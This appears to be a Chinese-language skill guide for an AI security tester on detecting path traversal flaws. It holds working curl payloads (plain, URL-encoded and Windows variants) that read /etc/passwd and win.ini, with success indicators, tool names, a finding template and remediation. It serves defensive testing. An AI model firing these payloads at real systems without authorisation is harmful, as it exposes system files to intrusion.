# 路径遍历漏洞检测技能

## 原理

路径遍历（Path Traversal）发生在 Web 应用未对文件路径进行充分校验时，攻击者可通过 `../` 跳出预期目录，读取任意文件。

**常见成因**：
- 用户输入直接拼接文件路径（`readfile("/uploads/" + user_input)`）
- 未过滤 `../` 序列
- 未限制访问范围（chroot jail 缺失）

## 检测方法

### 1. 定位文件读取点
- 文件下载：`/api/download?file=report.pdf`
- 图片加载：`/api/image?name=avatar.jpg`
- 日志查看：`/api/logs?file=access.log`

### 2. 构造路径遍历 Payload

**Payload 1 — 基本遍历**:
```bash
curl "http://target/api/download?file=../../../etc/passwd"
```

**Payload 2 — 编码绕过**:
```bash
curl "http://target/api/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
```

**Payload 3 — Windows 路径**:
```bash
curl "http://target/api/download?file=..\..\..\windows\win.ini"
```

### 3. 验证文件读取

**判断依据**：
- 响应包含 `root:x:0:0` → `/etc/passwd` 被读取
- 响应包含 `[fonts]` → `win.ini` 被读取
- 404 → 文件不存在或被拦截

## 工具

| 工具 | 用途 |
|---|---|
| curl | 命令行测试 |
| Burp Suite | 抓包修改参数 |
| dotdotpwn | 自动化路径遍历工具 |

## 输出格式

```json
{
  "finding_id": "path-traversal-001",
  "issue_type": "path-traversal",
  "severity": "high",
  "endpoint": "/api/download",
  "parameter": "file",
  "payload": "../../../etc/passwd",
  "evidence": "响应包含 root:x:0:0",
  "remediation": "白名单校验文件名，禁止 ../，使用 chroot jail"
}
```

## 注意事项

- **只读原则**：仅检测，不读取敏感文件（如私钥/密码）
- **无害 Payload**：使用 `/etc/passwd` / `win.ini` 验证
- **零触网**：测试用 mock 或本地环境
